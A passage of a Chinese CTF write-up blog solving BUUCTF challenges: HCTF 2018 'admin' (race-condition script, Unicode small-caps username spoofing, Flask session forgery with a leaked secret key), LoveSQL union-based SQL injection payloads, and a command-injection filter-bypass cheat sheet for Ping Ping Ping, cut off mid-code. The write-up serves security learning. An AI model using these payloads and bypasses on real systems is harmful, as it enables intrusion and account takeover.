class="keyword">import</span> get_verify_code</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/code&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span>():</span></span><br><span class="line">    image, code = get_verify_code()</span><br><span class="line">    <span class="comment"># 图片以二进制形式写入</span></span><br><span class="line">    buf = BytesIO()</span><br><span class="line">    image.save(buf, <span class="string">&#x27;jpeg&#x27;</span>)</span><br><span class="line">    buf_str = buf.getvalue()</span><br><span class="line">    <span class="comment"># 把buf_str作为response返回前端，并设置首部字段</span></span><br><span class="line">    response = make_response(buf_str)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/gif&#x27;</span></span><br><span class="line">    <span class="comment"># 将验证码字符串储存在session中</span></span><br><span class="line">    session[<span class="string">&#x27;image&#x27;</span>] = code</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, title = <span class="string">&#x27;hctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">&#x27;The username has been registered&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;register successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/change&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/edit&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;post successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, title = <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    title = unicode(error)</span><br><span class="line">    message = error.description</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;errors.html&#x27;</span>, title=title, message=message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><h3 id="解法一：条件竞争-未复现成功"><a href="#解法一：条件竞争-未复现成功" class="headerlink" title="解法一：条件竞争[未复现成功]"></a>解法一：条件竞争[未复现成功]</h3><p>此解法感觉是错误的，不过看飘零师傅的WP有详细描述，我这边复现没成功，若有了解的师傅欢迎找我讨论 :)</p><p>我们注意到，登录函数的写法有点奇怪。通常来说，SESSION存取登录成功的用户信息是在验证通过提交的账号与密码之后的事情，但这里的代码确实先将用户名存入SESSION中，不符合常理，可能存在绕过的可能。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def login():</span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        <span class="comment"># 通常验证通过再存入SESSION</span></span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user is None <span class="keyword">or</span> not user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br></pre></td></tr></table></figure><p>同时，对于修改密码函数来说：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br></pre></td></tr></table></figure><p>是从SESSION中获取用户名的。</p><p>这样的话就存在一种可能，就是当我们change函数执行到<code>name = strlower(session[&#39;name&#39;])</code>之前，我们已退出当前用户，并以错误的密码尝试登录admin用户，此时<code>session[&#39;name&#39;]</code>的值为admin，change函数便将admin账户的密码给成功修改了。</p><p>贴一下利用脚本，由syang@Whitzard编写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">s, username, password</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">&quot;http://admin.2018.hctf.io/login&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">&quot;http://admin.2018.hctf.io/logout&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">s, newpassword</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;newpassword&#x27;</span>:newpassword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">&quot;http://admin.2018.hctf.io/change&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span>(<span class="params">s</span>):</span></span><br><span class="line">    login(s, <span class="string">&#x27;skysec&#x27;</span>, <span class="string">&#x27;skysec&#x27;</span>)</span><br><span class="line">    change(s, <span class="string">&#x27;skysec&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span>(<span class="params">s</span>):</span></span><br><span class="line">    logout(s)</span><br><span class="line">    res = login(s, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;skysec&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">&#x27;finish&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>说明一下，此方法由我多次测试均不能修改admin的密码。我认为由于flask客户端session的特训，及时在change函数获取<code>session[&#39;name&#39;]</code>之前通过login函数修改了<code>session[&#39;name&#39;]</code>的值，但是change函数取到的值仍不会受到影响。flask的session存在客户端的Cookie之中，视图函数获取session相当于去解析其对应的请求体中的Cookie字段，而不是存在服务器端的session文件中，故在整个change函数里，session的值都不会改变，并不含产生竞争。</p><h3 id="解法二：Unicode欺骗"><a href="#解法二：Unicode欺骗" class="headerlink" title="解法二：Unicode欺骗"></a>解法二：Unicode欺骗</h3><p>我们注意到，在代码里，此处用到的一个自己定义的字符转小写函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>我们再去requirements.txt看一下这个库的版本是多少：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Twisted&#x3D;&#x3D;10.2.0</span><br></pre></td></tr></table></figure><p>而我们去官方的仓库：<code>https://github.com/twisted/twisted/releases</code>可以发现，在当时（18年）Twisted最新的版本为<code>18.7.0</code>。</p><p>这两个版本差别也太大了，而且专门导入一个库来进行字符转换感觉也很有问题。</p><p>一番查询后可以找到：<code>https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e</code></p><p>文中指出，在低版本的Twisted库中<code>nodeprep.prepare</code>会对特殊字符<code>ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡʏᴢ</code>(small caps)进行如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴀ-&gt;A-&gt;a</span><br></pre></td></tr></table></figure><p>可以发现ᴀ并不是被转成a而是大写的A，那么我们注意到，login在取参时会进行一次strlower转换且change又再一次进行strlower转换。</p><p>如此一来我们可以这样操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注册ᴀdmin用户(实际注册的用户是Admin)并登陆-&gt;以ᴀdmin用户名登陆-&gt;session存的用户名是Admin-&gt;更改密码时获取到的name为admin-&gt;成功修改admin的密码</span><br></pre></td></tr></table></figure><h3 id="解法三：Session伪造"><a href="#解法三：Session伪造" class="headerlink" title="解法三：Session伪造"></a>解法三：Session伪造</h3><p>参考p牛文章：<code>https://www.leavesongs.com/PENETRATION/client-session-security.html</code></p><p>由于flask客户端session的特性，且session存储方式类似JWT，仅仅只在末尾拼接了相应的hash作数据校验，故session的内容对于我们来说是可视的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure><p>又因为我们在config.py文件中可以发现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>SECRET_KEY可能为<code>ckj123</code>，如此一来我们便可以生成相应的hash拼接上我们的伪造的数据达到伪造session的作用。</p><p>利用脚本：<code>https://github.com/noraj/flask-session-cookie-manager</code></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>打开题目，看样子应该是前面那道简单题的简单升级版。</p><p><img src="https://img.0x002.com/article/BuuCTF/20200725203647.png" alt="LoveSQL题目页面"></p><p>随便输入一些数据，跳转到：<code>/check.php?username=1&amp;password=1</code>。</p><p>老样子，在username与password分别单独加单引号，发现均返回错误。说明应该是之前讲的第一种判断逻辑。</p><p>老EXP尝试：<code>username=1&#39;%20or1%3d1%23&amp;password=1</code>，成功登录，返回了管理员密码的密文值，看长度应该是MD5。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Login Success!</span><br><span class="line"></span><br><span class="line">Hello admin！</span><br><span class="line"></span><br><span class="line">Your password is &#39;5712153fef7655da3f5bf3af7ddf464b&#39;</span><br></pre></td></tr></table></figure><p>但尝试MD5解密失败，结果发现居然是明文，不过改换admin登录也没啥用，结合题目意思应该需要我们进行跨表注入。</p><p>联合注入经典步骤：</p><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;1&#39;%20or1%3d1order%20by%20&#123;字段数&#125;%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure><p>当尝试字段数为4时，返回报错信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unknown column &#39;4&#39; in &#39;order clause&#39;</span><br></pre></td></tr></table></figure><p>尝试3时返回正常，说明<code>union</code>前边的语句获取的字段数为3。</p><h3 id="查看回显位置"><a href="#查看回显位置" class="headerlink" title="查看回显位置"></a>查看回显位置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username&#x3D;1%27union%20select%201,2,3%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure><p>回显数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello 2！</span><br><span class="line"></span><br><span class="line">Your password is &#39;3&#39;</span><br></pre></td></tr></table></figure><p>我们选择在2字段处继续回显数据（任意选择）</p><h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,database(),3 #</span><br></pre></td></tr></table></figure><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() #</span><br></pre></td></tr></table></figure><h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name &#x3D; &#39;l0ve1ysq1&#39; #</span><br></pre></td></tr></table></figure><h3 id="取数据"><a href="#取数据" class="headerlink" title="取数据"></a>取数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(username,password),3 from l0ve1ysq1 #</span><br></pre></td></tr></table></figure><p>成功获得flag。</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>经典命令执行题了，这里简单总结一下。</p><ul><li><code>$&#123;IFS&#125;、$IFS$任意数字</code>，可充当空格。</li><li><code>&lt;、&gt;</code>可取代空格，如<code>cat&lt;flag.php</code>。</li><li><code>fla\g.php</code>、<code>fl*g.php</code>、<code>fla?.php</code>、<code>fl&#39;a&#39;g.php</code>均可被认作<code>flag.php</code>。</li><li><code>&#123;OS_COMMAND,ARGUMENT&#125;</code>，如：<code>&#123;cat,/etc/passwd&#125;</code>。</li><li><code>;a=g;cat fla$a.php;</code>，临时变量可做字符串拼接。</li><li><code>cat fla$&#123;n&#125;g.php</code>，n变量并未赋值，空变量拼接绕过空格。</li><li>通配符：<code>[a-z]、[abc]、&#123;a,b,c&#125;</code>类似<code>*、?</code>的功能，<code>fl[a-z]g.php</code>可取到<code>flag.php</code>。</li><li>编码转换：<code>echo &#39;Y2F0IGEudHh0Cg==&#39;|base64 |(ba)sh</code>、<code>echo &quot;63617420612e7478740a&quot;|xxd -r -p|sh</code></li><li><code>tac</code>命令相当于<code>cat</code>的镜像命令，取到的内容是倒序的，从最后一行取到第一行；<code>rev</code>命令是<code>cat</code>完全相反，从最后一个字符倒序取值。</li></ul><p>分隔符：</p><blockquote><p>1.<code>&amp;</code>，&amp; 表示将任务置于后台执行。<br>2.<code>&amp;&amp;</code>，只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。<br>3.<code>|</code>，| 表示管道，上一条命令的输出，作为下一条命令的参数<br>4.<code>||</code>，只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。<br>5.<code>;</code>，多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块<br>引自：<a href="https://blog.csdn.net/qq_42812036/java/article/details/104297163">https://blog.csdn.net/qq_42812036/java/article/details/104297163</a></p></blockquote><p>回到题目本身：</p><p>先列下目录：<code>?ip=1;ls</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PING 1 (0.0.0.1): 56 data bytes</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure><p>直接读取flag.php失败：<code>1;cat%20flag.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fxck your space! # 拦截了空格</span><br></pre></td></tr></table></figure><p>使用$IFS尝试代替绕过：<code>?ip=1;cat$IFS$1flag.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fxck your flag!</span><br></pre></td></tr></table></figure><p>转去读index.php文件查看源代码再做打算：<code>?ip=1;cat$IFS$1index.php</code>，得源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td 